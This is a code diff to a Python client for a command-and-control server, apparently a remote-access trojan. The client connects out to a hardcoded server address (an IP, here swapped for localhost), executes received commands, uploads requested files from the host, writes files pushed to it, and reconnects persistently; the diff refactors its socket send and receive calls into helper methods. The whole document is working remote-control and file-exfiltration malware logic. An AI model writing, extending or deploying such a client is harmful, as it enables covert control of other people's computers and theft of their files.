@@ -14,7 +14,8 @@ class client:
     # socket for connection to the server
     sock_to_server = None
     # ip address of our C&C server, can be changed depending on what ip server is located
-    host = '18.205.103.236'
+    # host = '18.205.103.236'
+    host = 'localhost'
     # port of the server to connect to, can be changed depending on what port server is listening at
     port = 3000
 
@@ -36,7 +37,7 @@ class client:
 
         while True:
             try:
-                cmd = client.sock_to_server.recv(client.BUFFER_SIZE)
+                cmd = self.client_recv()
 
                 # if downloading files
                 if cmd[:8].decode("utf-8") == "download":
@@ -44,7 +45,7 @@ class client:
                     if len(cmd_str) > 1:
                         self.send_file(cmd_str[1])
                     else:
-                        client.sock_to_server.send(str.encode("Input a file"))
+                        self.client_send(str.encode("Input a file"))
                     continue
 
                 # if uploading file
@@ -53,12 +54,12 @@ class client:
                     if len(cmd_str) > 1:
                         self.recv_file()
                     else:
-                        client.sock_to_server.send(str.encode("Input a file"))
+                        self.client_send(str.encode("Input a file"))
                     continue
 
                 #else runs the command
                 result = self.run_command(cmd)
-                client.sock_to_server.send(str.encode(result))
+                self.client_send(str.encode(result))
             except Exception as error:
                 client.sock_to_server.close()
                 self.connect()
@@ -173,32 +174,33 @@ class client:
 
     def send_file(self, filename):
         file_size = os.path.getsize(filename)
-        client.sock_to_server.send(f"BEGIN{filename}{client.SEPARATOR}{file_size}".encode())
+        self.client_send(f"BEGIN{filename}{client.SEPARATOR}{file_size}".encode())
         with open(filename, "rb") as file:
             bytes = file.read(client.BUFFER_SIZE)
             while bytes:
-                client.sock_to_server.sendall(bytes)
+                self.client_send(bytes)
                 bytes = file.read(client.BUFFER_SIZE)
 
     def recv_file(self):
-        # sending an ack to the server
-        client.sock_to_server.send(" ".encode())
-
         # now begin the file transfer
-        file_data = client.sock_to_server.recv(client.BUFFER_SIZE).decode()
+        file_data = self.client_recv().decode()
+
+        # sending an ack to the server
+        self.client_send(" ".encode())
+
         # start receiving file
         file_name, file_size = file_data.split(client.SEPARATOR)
         file_name = file_name.replace("BEGIN", "")
         file_name = os.path.basename(file_name)
         file_size = int(file_size)
         with open(file_name, "wb") as file:
-            bytes = client.sock_to_server.recv(client.BUFFER_SIZE)
+            bytes = self.client_recv()
             while True:
                 file.write(bytes)
                 file_size -= client.BUFFER_SIZE
                 if file_size <= 0:
                     break
-                bytes = client.sock_to_server.recv(client.BUFFER_SIZE)
+                bytes = self.client_recv()
 
     def connect(self):
         while True:
@@ -208,6 +210,14 @@ class client:
                 break
             except Exception as error:
                 time.sleep(10)
+
+    # send the msg to the server. msg is in bytes
+    def client_send(self, msg):
+        self.sock_to_server.send(msg)
+
+    # receive message from the server, the returned message is in bytes
+    def client_recv(self):
+        return self.sock_to_server.recv(client.BUFFER_SIZE)
 
 
 if __name__ == '__main__':
